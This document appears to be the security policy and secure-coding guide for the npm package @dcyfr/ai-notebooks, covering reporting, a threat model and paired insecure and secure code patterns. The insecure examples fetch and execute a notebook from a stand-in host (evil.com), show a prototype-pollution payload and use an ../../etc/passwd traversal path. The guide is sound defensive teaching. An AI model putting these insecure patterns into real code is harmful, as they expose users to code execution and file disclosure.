<!-- TLP:CLEAR -->
# Security Policy - @dcyfr/ai-notebooks

**Package:** @dcyfr/ai-notebooks  
**Version:** 1.0.0+  
**Last Updated:** February 8, 2026

---

## Vulnerability Reporting

**We take security seriously.** If you discover a security vulnerability in `@dcyfr/ai-notebooks`, please report it responsibly.

### Reporting Process

**Email:** security@dcyfr.ai  
**PGP Key:** Available at https://dcyfr.ai/security/pgp-key.asc

**Please include:**
1. Description of the vulnerability
2. Steps to reproduce
3. Affected versions
4. Potential impact assessment
5. Suggested mitigation (if any)

**Response Timeline:**
- **Initial Response:** Within 24 hours
- **Confirmation & Assessment:** Within 72 hours
- **Security Patch:** Critical vulnerabilities patched within 7 days
- **Public Disclosure:** After patch release + 14 days (coordinated disclosure)

**Bug Bounty:** Security researchers may be eligible for bounties through our [responsible disclosure program](https://dcyfr.ai/security/bounty).

---

## Data Science Security Threat Model

`@dcyfr/ai-notebooks` processes computational notebooks, datasets, and user-generated code. This creates unique security considerations beyond traditional web application security.

### Primary Threats

**1. Arbitrary Code Execution**
- **Risk:** Malicious notebook cells executing untrusted code
- **Attack Vector:** Imported notebooks from untrusted sources, third-party notebook repositories
- **Impact:** System compromise, data exfiltration, denial of service
- **Mitigation:** See [Execution Security](#execution-security) patterns

**2. Data Poisoning**
- **Risk:** Manipulated CSV/dataset inputs causing incorrect analysis
- **Attack Vector:** Tampered data files, malicious dataset imports
- **Impact:** Incorrect business decisions, model training corruption
- **Mitigation:** See [Data Validation](#data-validation) patterns

**3. Personally Identifiable Information (PII) Exposure**
- **Risk:** Sensitive data in notebooks/datasets inadvertently exposed
- **Attack Vector:** Shared notebooks, exported datasets, version control commits
- **Impact:** GDPR/CCPA violations, privacy breaches
- **Mitigation:** See [Data Privacy](#data-privacy) patterns

**4. Injection Attacks via Visualizations**
- **Risk:** Malicious content in chart labels causing injection vulnerabilities
- **Attack Vector:** User-controlled visualization labels, tooltips, titles
- **Impact:** XSS (if charts rendered in web), terminal escape sequence injection
- **Mitigation:** See [Output Sanitization](#output-sanitization) patterns

**5. Denial of Service (Memory/CPU Exhaustion)**
- **Risk:** Malicious datasets or notebooks consuming excessive resources
- **Attack Vector:** Large CSV files, infinite loops in notebook cells, recursive visualizations
- **Impact:** Application crashes, resource starvation
- **Mitigation:** See [Resource Limits](#resource-limits) patterns

**6. Dependency Vulnerabilities**
- **Risk:** Security flaws in data processing libraries (csv-parse, etc.)
- **Attack Vector:** Supply chain attacks, transitive dependencies
- **Impact:** Varies based on vulnerability (RCE, XSS, DoS)
- **Mitigation:** See [Dependency Security](#dependency-security)

**7. Insecure Deserialization**
- **Risk:** Malicious payloads in JSON notebooks causing code execution
- **Attack Vector:** Crafted `.ipynb` files, tampered notebook metadata
- **Impact:** Remote code execution, privilege escalation
- **Mitigation:** See [Safe Deserialization](#safe-deserialization) patterns

**8. Path Traversal**
- **Risk:** Malicious file paths in dataset loading causing access to restricted files
- **Attack Vector:** CSV imports with `../../etc/passwd` paths
- **Impact:** Unauthorized file access, information disclosure
- **Mitigation:** See [File I/O Security](#file-io-security) patterns

---

## OWASP Top 10 Compliance

| OWASP Risk | Relevance | Mitigation in @dcyfr/ai-notebooks |
|------------|-----------|-----------------------------------|
| **A01: Broken Access Control** | Medium | No server-side access control (client library). Users must implement auth when exposing notebooks via API. |
| **A02: Cryptographic Failures** | Low | No cryptographic operations. Users should encrypt sensitive notebooks at rest. |
| **A03: Injection** | **HIGH** | Input validation via Zod, CSV parsing sanitization, escaped visualization labels. See [Data Validation](#data-validation). |
| **A04: Insecure Design** | Medium | Immutable data structures, functional APIs reduce state-related vulnerabilities. |
| **A05: Security Misconfiguration** | Medium | Secure defaults (no code execution by default). Users must opt-in to `executeNotebook()`. |
| **A06: Vulnerable Components** | **HIGH** | Minimal dependencies (csv-parse, zod). Automated npm audit. See [Dependency Security](#dependency-security). |
| **A07: Authentication Failures** | N/A | No authentication (client library). |
| **A08: Software & Data Integrity** | **HIGH** | Notebook signature validation recommended for production. See [Integrity Verification](#integrity-verification). |
| **A09: Logging & Monitoring Failures** | Low | Users should implement logging for executed cells. Example in [Execution Security](#execution-security). |
| **A10: Server-Side Request Forgery** | Medium | If notebooks fetch external data, users must validate URLs. See [Network Security](#network-security). |

---

## Secure Coding Patterns

### 1. Execution Security

**❌ INSECURE: Executing Untrusted Notebooks**

```typescript
// DANGER: Executing arbitrary code from unknown source
const untrustedJSON = await fetch('https://evil.com/notebook.ipynb').then(r => r.text());
const nb = importNotebook(untrustedJSON);
await executeNotebook(nb); // ⚠️ Arbitrary code execution!
```

**✅ SECURE: Sandboxed Execution with Validation**

```typescript
import { importNotebook, executeNotebook, codeCellCount } from '@dcyfr/ai-notebooks';
import { VM } from 'vm2'; // Sandbox library

// 1. Validate notebook before importing
const notebookJSON = await fetch(url).then(r => r.text());
const nb = importNotebook(notebookJSON); // Zod validation protects against malformed JSON

// 2. Pre-execution validation
if (codeCellCount(nb) > 100) {
  throw new Error('Notebook has too many code cells (potential DoS)');
}

// 3. Sandboxed executor
const sandboxedExecutor = async (source: string) => {
  const vm = new VM({
    timeout: 5000, // 5-second timeout per cell
    sandbox: {
      console: {
        log: (...args) => console.log('[SANDBOX]', ...args),
        // Disable other console methods
      },
      // Whitelist only safe globals
    },
  });
  
  try {
    const result = vm.run(source);
    return { outputs: [{ outputType: 'execute_result', data: result }], status: 'completed' };
  } catch (err) {
    return { outputs: [{ outputType: 'error', data: err }], status: 'error' };
  }
};

// 4. Execute with custom executor
const { result } = await executeNotebook(nb, {
  executor: sandboxedExecutor,
  stopOnError: true,
  timeout: 30000, // 30-second total timeout
});
```

**Best Practices:**
- ✅ Use sandboxing libraries (vm2, isolated-vm) for untrusted code
- ✅ Implement per-cell and total execution timeouts
- ✅ Whitelist allowed globals (no `process`, `require`, `fs`)
- ✅ Validate notebook structure before execution
- ✅ Log all executed cells for audit trails

---

### 2. Data Validation

**❌ INSECURE: Trusting User Input**

```typescript
// DANGER: No validation on CSV data
const csv = await fetch(url).then(r => r.text());
const dataset = parseCSV(csv);

// Directly using unvalidated data
const stats = describe(dataset);
const total = sum(getNumericColumn(dataset, userProvidedColumn)); // Injection risk!
```

**✅ SECURE: Input Validation with Zod Schemas**

```typescript
import { parseCSV, validateDataset, required, isNumber, isString, inRange, matchesPattern } from '@dcyfr/ai-notebooks';
import { z } from 'zod';

// 1. Validate CSV size before parsing
const csv = await fetch(url).then(r => r.text());
if (csv.length > 10_000_000) { // 10MB limit
  throw new Error('CSV file too large');
}

// 2. Parse CSV with safe options
const dataset = parseCSV(csv, {
  delimiter: ',', // Explicit delimiter
  skipEmptyLines: true,
});

// 3. Define expected schema
const salesSchema = {
  product: [required(), isString(), matchesPattern(/^[a-zA-Z0-9\s\-]+$/)], // Alphanumeric only
  revenue: [required(), isNumber(), inRange(0, 10_000_000)],
  units: [required(), isNumber(), inRange(1, 1_000_000)],
  category: [required(), isString(), oneOf(['Hardware', 'Software', 'Services'])],
};

// 4. Validate dataset
const validation = validateDataset(dataset, salesSchema);

if (!validation.valid) {
  console.error('Validation errors:');
  validation.errors.forEach((err) => {
    console.error(`Row ${err.row}, Column ${err.column}: ${err.message}`);
  });
  throw new Error('Invalid dataset');
}

// 5. Sanitize column names (prevent injection)
const safeColumn = userProvidedColumn.replace(/[^a-zA-Z0-9_]/g, '');
if (!dataset.schema.some((col) => col.name === safeColumn)) {
  throw new Error('Invalid column name');
}

// Now safe to use
const stats = describe(dataset);
```

**Best Practices:**
- ✅ Validate all dataset inputs with explicit schemas
- ✅ Enforce size limits (CSV file size, row count, column count)
- ✅ Sanitize column names (alphanumeric + underscore only)
- ✅ Use whitelisting for categorical values (`oneOf` validator)
- ✅ Reject datasets with validation errors

---

### 3. Data Privacy

**❌ INSECURE: PII in Notebooks**

```typescript
// DANGER: PII in notebook cells
const nb = createNotebook();
nb = addCell(nb, codeCell(`
  const customers = [
    { email: 'john.doe@example.com', ssn: '123-45-6789' }, // ⚠️ PII!
    { email: 'jane@example.com', ssn: '987-65-4321' }
  ];
`));

// Publishing notebook exposes PII
fs.writeFileSync('analysis.ipynb', exportNotebook(nb));
```

**✅ SECURE: PII Detection and Redaction**

```typescript
import { createNotebook, addCell, codeCell, exportNotebook } from '@dcyfr/ai-notebooks';

// PII detection patterns
const PII_PATTERNS = {
  email: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g,
  ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
  phone: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/g,
  creditCard: /\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b/g,
};

function detectPII(text: string): string[] {
  const found: string[] = [];
  for (const [type, pattern] of Object.entries(PII_PATTERNS)) {
    if (pattern.test(text)) {
      found.push(type);
    }
  }
  return found;
}

function redactPII(text: string): string {
  let redacted = text;
  redacted = redacted.replace(PII_PATTERNS.email, '[REDACTED EMAIL]');
  redacted = redacted.replace(PII_PATTERNS.ssn, '[REDACTED SSN]');
  redacted = redacted.replace(PII_PATTERNS.phone, '[REDACTED PHONE]');
  redacted = redacted.replace(PII_PATTERNS.creditCard, '[REDACTED CC]');
  return redacted;
}

// Before exporting notebook
for (let i = 0; i < nb.cells.length; i++) {
  const cell = nb.cells[i];
  const piiTypes = detectPII(cell.source);
  
  if (piiTypes.length > 0) {
    console.warn(`Cell ${i} contains PII: ${piiTypes.join(', ')}`);
    
    // Option 1: Redact automatically
    nb = updateCell(nb, i, (c) => ({
      ...c,
      source: redactPII(c.source),
    }));
    
    // Option 2: Reject export
    // throw new Error(`Cannot export notebook with PII in cell ${i}`);
  }
}

// Safe to export
fs.writeFileSync('analysis-safe.ipynb', exportNotebook(nb));
```

**GDPR Compliance:**
```typescript
// Implement right to erasure
function anonymizeDataset(dataset: Dataset): Dataset {
  return mapRows(dataset, (row) => ({
    ...row,
    name: hashValue(row.name), // One-way hash
    email: undefined, // Remove PII
    customerId: hashValue(row.customerId), // Pseudonymization
  }));
}

// Data retention policies
function applyRetention(nb: Notebook, retentionDays: number): Notebook {
  const cutoff = Date.now() - retentionDays * 24 * 60 * 60 * 1000;
  if (nb.metadata.createdAt && nb.metadata.createdAt.getTime() < cutoff) {
    throw new Error('Notebook exceeds retention period and must be deleted');
  }
  return nb;
}
```

**Best Practices:**
- ✅ Scan all notebook cells for PII before export/sharing
- ✅ Implement automatic redaction for known PII patterns
- ✅ Use pseudonymization (hashing) for identifiers
- ✅ Document data retention policies
- ✅ Provide data deletion mechanisms (GDPR right to erasure)

---

### 4. Output Sanitization

**❌ INSECURE: Unsanitized Visualization Labels**

```typescript
// DANGER: User-controlled chart labels
const userInput = req.body.chartTitle; // From web form
const chart = barChart(userInput, labels, values); // ⚠️ Injection risk!

// If rendered in HTML: XSS vulnerability
// If rendered in terminal: escape sequence injection
```

**✅ SECURE: Sanitized Outputs**

```typescript
import { barChart, renderBarChart } from '@dcyfr/ai-notebooks';

// HTML context: Escape HTML entities
function escapeHTML(text: string): string {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Terminal context: Strip ANSI escape codes
function stripANSI(text: string): string {
  return text.replace(/\x1B\[[0-9;]*[a-zA-Z]/g, '');
}

// Validate and sanitize
function sanitizeChartTitle(title: string): string {
  // 1. Length limit
  if (title.length > 100) {
    throw new Error('Chart title too long');
  }
  
  // 2. Character whitelist (alphanumeric + basic punctuation)
  const sanitized = title.replace(/[^a-zA-Z0-9\s\-_:.,!?]/g, '');
  
  // 3. Context-specific escaping
  if (isHTMLContext()) {
    return escapeHTML(sanitized);
  } else {
    return stripANSI(sanitized);
  }
}

const safeTitle = sanitizeChartTitle(userInput);
const chart = barChart(safeTitle, labels, values);
console.log(renderBarChart(chart));
```

**Best Practices:**
- ✅ Sanitize all user-controlled strings before visualization
- ✅ Use context-appropriate escaping (HTML, terminal, JSON)
- ✅ Enforce length limits on labels/titles
- ✅ Whitelist allowed characters (alphanumeric + safe punctuation)

---

### 5. Resource Limits

**❌ INSECURE: Unbounded Resource Consumption**

```typescript
// DANGER: No limits on dataset size
const hugeCSV = await fetch('https://evil.com/10gb-file.csv').then(r => r.text());
const dataset = parseCSV(hugeCSV); // ⚠️ Out of memory!

// Infinite loop in notebook
nb = addCell(nb, codeCell('while(true) {}'));
await executeNotebook(nb); // ⚠️ Hangs forever!
```

**✅ SECURE: Resource Limits and Timeouts**

```typescript
import { parseCSV, executeNotebook, cellCount } from '@dcyfr/ai-notebooks';

// 1. CSV size limit (streaming recommended for large files)
const MAX_CSV_SIZE = 100 * 1024 * 1024; // 100MB

async function loadCSVSafely(url: string): Promise<Dataset> {
  const response = await fetch(url);
  const contentLength = response.headers.get('content-length');
  
  if (contentLength && parseInt(contentLength) > MAX_CSV_SIZE) {
    throw new Error('CSV file exceeds size limit');
  }
  
  const csv = await response.text();
  
  if (csv.length > MAX_CSV_SIZE) {
    throw new Error('CSV file exceeds size limit');
  }
  
  return parseCSV(csv);
}

// 2. Row count limits
function enforceRowLimit(dataset: Dataset, maxRows: number = 1_000_000): Dataset {
  if (dataset.rows.length > maxRows) {
    throw new Error(`Dataset has ${dataset.rows.length} rows (max: ${maxRows})`);
  }
  return dataset;
}

// 3. Notebook complexity limits
function validateNotebookComplexity(nb: Notebook): void {
  if (cellCount(nb) > 500) {
    throw new Error('Notebook has too many cells');
  }
  
  const totalSource = nb.cells.reduce((sum, cell) => sum + cell.source.length, 0);
  if (totalSource > 5_000_000) { // 5MB source code limit
    throw new Error('Notebook source code too large');
  }
}

// 4. Execution with timeouts
const { result } = await executeNotebook(nb, {
  timeout: 5000, // 5 seconds per cell
  stopOnError: true,
});

// 5. Memory monitoring (Node.js)
function checkMemoryUsage(): void {
  const usage = process.memoryUsage();
  const limitMB = 512;
  
  if (usage.heapUsed > limitMB * 1024 * 1024) {
    throw new Error('Memory limit exceeded');
  }
}

// Call before expensive operations
checkMemoryUsage();
const stats = describe(largeDataset);
```

**Best Practices:**
- ✅ Enforce file size limits (CSV, notebooks)
- ✅ Limit row counts in datasets (1M rows max recommended)
- ✅ Implement cell execution timeouts (5-30 seconds per cell)
- ✅ Monitor memory usage and fail gracefully
- ✅ Limit notebook complexity (cell count, source code size)

---

### 6. Safe Deserialization

**❌ INSECURE: Unvalidated JSON Import**

```typescript
// DANGER: Trusting arbitrary JSON
const maliciousJSON = '{"cells": [{"cellType": "code", "__proto__": {"polluted": true}}]}';
const nb = JSON.parse(maliciousJSON); // ⚠️ Prototype pollution!
await executeNotebook(nb); // May execute malicious code
```

**✅ SECURE: Schema-Validated Imports**

```typescript
import { importNotebook } from '@dcyfr/ai-notebooks';
import { z } from 'zod';

// importNotebook already uses Zod validation internally
try {
  const nb = importNotebook(untrustedJSON);
  // Zod schema ensures:
  // - No __proto__ pollution
  // - Valid cell types only
  // - Metadata is properly typed
  // - No unexpected properties
} catch (err) {
  console.error('Invalid notebook format:', err.message);
  // Reject malformed notebooks
}

// Additional validation for production
function validateNotebookMetadata(nb: Notebook): void {
  // Ensure kernel is from whitelist
  const allowedKernels = ['python3', 'julia-1.9', 'javascript'];
  if (nb.metadata.kernelspec && !allowedKernels.includes(nb.metadata.kernelspec.name)) {
    throw new Error(`Kernel '${nb.metadata.kernelspec.name}' not allowed`);
  }
  
  // Check for suspicious metadata
  if (nb.metadata.executionCount && nb.metadata.executionCount > 100000) {
    console.warn('Suspicious execution count detected');
  }
}
```

**Best Practices:**
- ✅ Always use `importNotebook()` (includes Zod validation)
- ✅ Never use raw `JSON.parse()` on notebook files
- ✅ Validate notebook metadata against whitelists
- ✅ Reject notebooks with unknown properties

---

### 7. File I/O Security

**❌ INSECURE: Path Traversal Vulnerability**

```typescript
// DANGER: User-controlled file paths
const filename = req.body.filename; // From web form
const csv = fs.readFileSync(`./data/${filename}`, 'utf-8'); // ⚠️ Path traversal!
// Attacker could use: ../../../../etc/passwd
```

**✅ SECURE: Path Validation and Sanitization**

```typescript
import path from 'path';
import fs from 'fs';

function sanitizeFilePath(userPath: string, baseDir: string): string {
  // 1. Remove any directory traversal sequences
  const sanitized = path.normalize(userPath).replace(/^(\.\.(\/|\\|$))+/, '');
  
  // 2. Resolve to absolute path
  const fullPath = path.resolve(baseDir, sanitized);
  
  // 3. Ensure path is within allowed directory
  if (!fullPath.startsWith(path.resolve(baseDir))) {
    throw new Error('Path traversal detected');
  }
  
  // 4. Check file extension whitelist
  const ext = path.extname(fullPath);
  const allowedExtensions = ['.csv', '.json', '.ipynb'];
  if (!allowedExtensions.includes(ext)) {
    throw new Error(`File extension '${ext}' not allowed`);
  }
  
  return fullPath;
}

// Usage
const DATA_DIR = '/var/app/data';
const safePath = sanitizeFilePath(userFilename, DATA_DIR);
const csv = fs.readFileSync(safePath, 'utf-8');
const dataset = parseCSV(csv);
```

**Best Practices:**
- ✅ Validate all file paths against base directory
- ✅ Use `path.resolve()` to prevent traversal
- ✅ Whitelist allowed file extensions
- ✅ Never concatenate user input directly into paths

---

### 8. Network Security

**❌ INSECURE: Unvalidated External Requests**

```typescript
// DANGER: SSRF vulnerability
const url = req.body.dataUrl; // User-controlled
const response = await fetch(url); // ⚠️ Could access internal network!
const data = await response.text();
```

**✅ SECURE: URL Validation and Timeouts**

```typescript
import { URL } from 'url';

function validateURL(urlString: string): URL {
  let url: URL;
  
  // 1. Parse URL
  try {
    url = new URL(urlString);
  } catch {
    throw new Error('Invalid URL');
  }
  
  // 2. Protocol whitelist
  if (!['http:', 'https:'].includes(url.protocol)) {
    throw new Error('Only HTTP/HTTPS allowed');
  }
  
  // 3. Block private/internal IPs
  const hostname = url.hostname;
  const blockedPatterns = [
    /^localhost$/i,
    /^127\.\d+\.\d+\.\d+$/,
    /^10\.\d+\.\d+\.\d+$/,
    /^172\.(1[6-9]|2\d|3[01])\.\d+\.\d+$/,
    /^192\.168\.\d+\.\d+$/,
    /^169\.254\.\d+\.\d+$/, // Link-local
  ];
  
  if (blockedPatterns.some((pattern) => pattern.test(hostname))) {
    throw new Error('Access to private networks not allowed');
  }
  
  // 4. Domain whitelist (optional)
  const allowedDomains = ['data.example.com', 'api.example.com'];
  if (!allowedDomains.some((domain) => hostname.endsWith(domain))) {
    throw new Error('Domain not whitelisted');
  }
  
  return url;
}

// Secure fetch with timeout
async function fetchSafely(urlString: string): Promise<string> {
  const url = validateURL(urlString);
  
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000); // 10-second timeout
  
  try {
    const response = await fetch(url.toString(), {
      signal: controller.signal,
      headers: {
        'User-Agent': '@dcyfr/ai-notebooks/1.0.0',
      },
    });
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    // Size limit
    const contentLength = response.headers.get('content-length');
    if (contentLength && parseInt(contentLength) > 100_000_000) {
      throw new Error('Response too large');
    }
    
    return await response.text();
  } finally {
    clearTimeout(timeout);
  }
}
```

**Best Practices:**
- ✅ Validate URLs against protocol whitelist (http/https only)
- ✅ Block access to private IP ranges (prevent SSRF)
- ✅ Implement domain whitelisting when possible
- ✅ Use timeouts for all network requests
- ✅ Enforce response size limits

---

### 9. Dependency Security

**Current Dependencies:**
```json
{
  "dependencies": {
    "csv-parse": "^5.5.3",
    "zod": "^3.22.4"
  }
}
```

**Security Posture:**
- **Minimal attack surface:** Only 2 production dependencies
- **Well-maintained:** Both libraries actively maintained with security patches
- **Type-safe:** Zod provides runtime validation, reducing injection risks

**Automated Security Scanning:**

```bash
# Run npm audit before releases
npm audit --production

# Expected: 0 vulnerabilities
```

**Update Policy:**
1. **Security patches:** Applied within 24 hours of disclosure
2. **Minor updates:** Reviewed and applied quarterly
3. **Major updates:** Evaluated for breaking changes, applied annually

**Transitive Dependency Monitoring:**
```bash
# Check full dependency tree
npm ls --production

# Expected dependencies:
# ├── csv-parse@5.5.3
# │   └── No transitive dependencies
# └── zod@3.22.4
#     └── No transitive dependencies
```

**Best Practices:**
- ✅ Run `npm audit` before every release
- ✅ Keep dependencies up-to-date (patch versions)
- ✅ Monitor security advisories (GitHub Dependabot)
- ✅ Minimize dependency count (current: 2)

---

### 10. Integrity Verification

**❌ INSECURE: Untrusted Notebook Imports**

```typescript
// DANGER: No verification of notebook authenticity
const nb = importNotebook(downloadedJSON);
await executeNotebook(nb); // Could be tampered
```

**✅ SECURE: Cryptographic Signatures**

```typescript
import crypto from 'crypto';

// Sign notebook on export
function signNotebook(notebook: Notebook, privateKey: crypto.KeyObject): string {
  const json = exportNotebook(notebook);
  const sign = crypto.createSign('SHA256');
  sign.update(json);
  sign.end();
  
  const signature = sign.sign(privateKey, 'hex');
  
  return JSON.stringify({
    notebook: json,
    signature,
    signedAt: new Date().toISOString(),
  });
}

// Verify notebook on import
function verifyAndImport(signedJSON: string, publicKey: crypto.KeyObject): Notebook {
  const { notebook, signature, signedAt } = JSON.parse(signedJSON);
  
  const verify = crypto.createVerify('SHA256');
  verify.update(notebook);
  verify.end();
  
  const isValid = verify.verify(publicKey, signature, 'hex');
  
  if (!isValid) {
    throw new Error('Notebook signature verification failed');
  }
  
  console.log(`Notebook verified, signed at ${signedAt}`);
  return importNotebook(notebook);
}

// Usage
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
});

const signed = signNotebook(myNotebook, privateKey);
const verified = verifyAndImport(signed, publicKey);
```

**Best Practices:**
- ✅ Sign notebooks before distribution
- ✅ Verify signatures before execution
- ✅ Use asymmetric cryptography (RSA/ECDSA)
- ✅ Include timestamp in signature payload

---

## Compliance

### GDPR (General Data Protection Regulation)

**Data Subject Rights:**
1. **Right to Erasure:** Implement dataset deletion and notebook purging
2. **Right to Access:** Export user notebooks in portable format (.ipynb)
3. **Right to Rectification:** Allow dataset correction and re-execution
4. **Data Minimization:** Only collect necessary data in notebooks

**Implementation Example:**
```typescript
// GDPR-compliant data handling
function handleGDPRRequest(action: 'export' | 'delete', userId: string): void {
  switch (action) {
    case 'export':
      const notebooks = getUserNotebooks(userId);
      notebooks.forEach((nb) => {
        fs.writeFileSync(`${userId}-${nb.metadata.title}.ipynb`, exportNotebook(nb));
      });
      break;
    
    case 'delete':
      deleteUserNotebooks(userId);
      deleteUserDatasets(userId);
      auditLog(`User ${userId} data deleted`);
      break;
  }
}
```

---

### CCPA (California Consumer Privacy Act)

**Consumer Rights:**
- Disclosure of collected data (notebook metadata, execution logs)
- Deletion of personal information
- Opt-out of data selling (N/A for @dcyfr/ai-notebooks - no data selling)

---

### SOC 2 Type II

**Recommended Controls for Production Use:**
1. **Access Control:** Implement RBAC for notebook execution
2. **Encryption:** Encrypt notebooks at rest (AES-256)
3. **Audit Logging:** Log all notebook imports, exports, executions
4. **Monitoring:** Track resource usage, execution failures
5. **Incident Response:** Define process for security incidents

---

### ISO 27001

**Information Security Management:**
- Asset classification (notebooks, datasets)
- Risk assessment (see [Threat Model](#data-science-security-threat-model))
- Incident management
- Business continuity (notebook backups)

---

## Production Deployment Checklist

Before deploying `@dcyfr/ai-notebooks` to production:

- [ ] **Dependency Audit:** Run `npm audit --production` (0 vulnerabilities)
- [ ] **Input Validation:** All dataset inputs validated with Zod schemas
- [ ] **Execution Sandboxing:** Untrusted notebooks executed in sandboxed environment (vm2, containers)
- [ ] **Resource Limits:** Timeouts, memory limits, file size limits enforced
- [ ] **PII Scanning:** Automated PII detection before notebook export
- [ ] **Logging:** Execution logs captured for audit trails
- [ ] **Encryption:** Sensitive notebooks encrypted at rest (AES-256)
- [ ] **Access Control:** RBAC implemented for multi-user environments
- [ ] **Network Security:** URL validation, SSRF prevention for external data fetches
- [ ] **Integrity Checks:** Notebook signature verification for production pipelines
- [ ] **Error Handling:** Graceful failures with no sensitive information in errors
- [ ] **Rate Limiting:** Prevent abuse of notebook execution APIs
- [ ] **Monitoring:** Alerts for suspicious activity (high execution counts, error rates)
- [ ] **Backup & Recovery:** Regular notebook backups, disaster recovery plan
- [ ] **Compliance:** GDPR/CCPA compliance if handling EU/CA user data

---

## Security Contact

**Primary Contact:** security@dcyfr.ai  
**Security Team:** https://dcyfr.ai/security  
**PGP Key:** https://dcyfr.ai/security/pgp-key.asc  
**Bug Bounty:** https://dcyfr.ai/security/bounty  

**Response Times:**
- **Critical Vulnerabilities:** 24-hour response, 7-day patch
- **High Severity:** 72-hour response, 14-day patch
- **Medium/Low Severity:** 7-day response, 30-day patch

---

**Last Updated:** February 8, 2026  
**Document Version:** 1.0.0  
**Security Policy Revision:** 2026-02-01  
**Next Review:** May 8, 2026
